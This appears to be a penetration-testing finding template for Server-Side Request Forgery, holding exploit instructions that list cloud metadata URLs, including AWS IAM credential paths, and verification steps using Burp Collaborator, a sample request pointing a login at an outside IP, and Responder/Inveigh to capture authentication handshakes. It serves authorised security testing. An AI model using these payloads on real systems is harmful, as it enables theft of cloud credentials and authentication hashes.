{"default_url":null,"content":{"state":0,"taskInstructions":null,"references":[],"isTaskInstructionsVisible":true,"isCommentMandatory":false,"fields":[],"masterFinding":{"id":17055128,"exploitInstructions":"If you are in the cloud, attempt to reach some of the metadata services: https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b (copied below)\n\n## AWS\n# from http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories\n\nhttp://169.254.169.254/latest/user-data\nhttp://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]\nhttp://169.254.169.254/latest/meta-data/ami-id\nhttp://169.254.169.254/latest/meta-data/reservation-id\nhttp://169.254.169.254/latest/meta-data/hostname\nhttp://169.254.169.254/latest/meta-data/public-keys/0/openssh-key\nhttp://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key\n\n# AWS - Dirs \n\nhttp://169.254.169.254/\nhttp://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/public-keys/\n\n## Google Cloud\n#  https://cloud.google.com/compute/docs/metadata\n#  - Requires the header \"Metadata-Flavor: Google\" or \"X-Google-Metadata-Request: True\"\n\nhttp://169.254.169.254/computeMetadata/v1/\nhttp://metadata.google.internal/computeMetadata/v1/\nhttp://metadata/computeMetadata/v1/\nhttp://metadata.google.internal/computeMetadata/v1/instance/hostname\nhttp://metadata.google.internal/computeMetadata/v1/instance/id\nhttp://metadata.google.internal/computeMetadata/v1/project/project-id\n\n# Google allows recursive pulls \nhttp://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true\n\n## Google\n#  Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)\n\nhttp://metadata.google.internal/computeMetadata/v1beta1/\n\n## Digital Ocean\n# https://developers.digitalocean.com/documentation/metadata/\n\nhttp://169.254.169.254/metadata/v1.json\nhttp://169.254.169.254/metadata/v1/ \nhttp://169.254.169.254/metadata/v1/id\nhttp://169.254.169.254/metadata/v1/user-data\nhttp://169.254.169.254/metadata/v1/hostname\nhttp://169.254.169.254/metadata/v1/region\nhttp://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address\n\n## Packetcloud\n\nhttps://metadata.packet.net/userdata\n\n## Azure\n#  Limited, maybe more exist?\n# https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/\nhttp://169.254.169.254/metadata/v1/maintenance\n\n## Update Apr 2017, Azure has more support; requires the header \"Metadata: true\"\n# https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service\nhttp://169.254.169.254/metadata/instance?api-version=2017-04-02\nhttp://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text\n\n## OpenStack/RackSpace \n# (header required? unknown)\nhttp://169.254.169.254/openstack\n\n## HP Helion \n# (header required? unknown)\nhttp://169.254.169.254/2009-04-04/meta-data/ \n\n## Oracle Cloud\nhttp://192.0.0.192/latest/\nhttp://192.0.0.192/latest/user-data/\nhttp://192.0.0.192/latest/meta-data/\nhttp://192.0.0.192/latest/attributes/\n\n## Alibaba\nhttp://100.100.100.200/latest/meta-data/\nhttp://100.100.100.200/latest/meta-data/instance-id\nhttp://100.100.100.200/latest/meta-data/image-id","verificationInstructions":"<b>Verification Instructions</b>\n\nIdentify parameters in the application that can be modified to force the backend servers to connect to a remote resource. Try capturing connection and DNS requests with Burp Collaborator. If outbound connectivity is allowed, attempt to connect to a pentest server to capture authentication handshakes (both SMB and HTTP).\n\nSample:\n\nhttps://website/login?username=uid&amp;password=pwd&amp;server=209.118.108.216\n\nExternal Service Interaction (DNS) on URL/Host header, follow these steps to verify if it's actually a finding:\nInject arbitrary addresses (Collaborator URL, internal IPs, invalid DNS names) to URL/Host header\nIf the response comes from the &quot;right&quot; application regardless, and the is no indication that the injection resulted in a HTTP request to the injected domain, the finding should be marked false\n\n<b>Reporting Requirements</b>\nAdd an explanation what causes the connection\nShow the initial page\nShow request with modified parameters\nShow captured traffic\n<b>Further Testing</b>\n\nReport the following vulnerabilities if applicable:\nInsufficient egress filtering\n\n<b>Tools</b>\nBurp Collaborator\nResponder\nInveigh\n","remediationInstructions":"Ensure sensitive endpoint information stays server-side and is not modifiable by the client.\n","name":"Server-Side Request Forgery","sourceId":"M:ed068937-a6df-e411-a2a9-001e4f12001c","severity":"High","businessImpact":"An attacker could potentially capture application server or endpoint credentials, or other sensitive information contained in the modified application request. ","description":"As part of the application workflow, the application established a connection to an external resource. It is possible to modify the endpoint for this resource and force the application server to attempt to access a different location.\n"}}}